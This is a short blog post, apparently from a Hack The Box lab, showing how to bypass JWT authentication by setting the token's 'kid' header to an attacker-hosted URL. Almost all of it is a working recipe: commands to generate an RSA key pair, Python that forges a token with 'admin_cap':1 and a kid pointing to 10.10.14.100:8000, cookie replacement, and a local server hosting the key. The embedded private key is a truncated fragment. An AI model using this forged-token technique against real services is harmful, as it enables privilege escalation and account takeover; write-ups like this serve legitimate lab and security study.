---
layout: post
title: "bypassing JWT using remote KID"
keywords: "jwt, json, token, kid, web token"
---

> `"kid" (key ID)` is an optional header claim which holds a key identifier, particularly useful when you have multiple keys to sign the tokens and you need to look up the right one to verify the signature - [https://tools.ietf.org/html/rfc7515#section-4.1.4](https://tools.ietf.org/html/rfc7515#section-4.1.4)


#### First create a new private RSA Private Key

```
ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
cat jwtRS256.key
cat jwtRS256.key.pub
```

#### Grab header and payload 
-> https://jwt.io/

#### Generate new token

```
private_key = ‘’'
-----BEGIN RSA PRIVATE KEY-----
88CVL/nFFPb+EcPpz9N2OTG4T8gAsYxgAU3q/Llt/NnXASm6CO4p82VXjaGz
-----END RSA PRIVATE KEY-----
‘’'
payload = {"username":"parity0x1","email":"parity0x1@htb.htb","admin_cap":1}
encoded = jwt.encode(payload, private_key, algorithm="RS256",headers={"kid":"http://10.10.14.100:8000/jwtRS256.key"})
print(encoded)
```

#### Replace cookie

#### Start local server
```
python3 -m http.server
```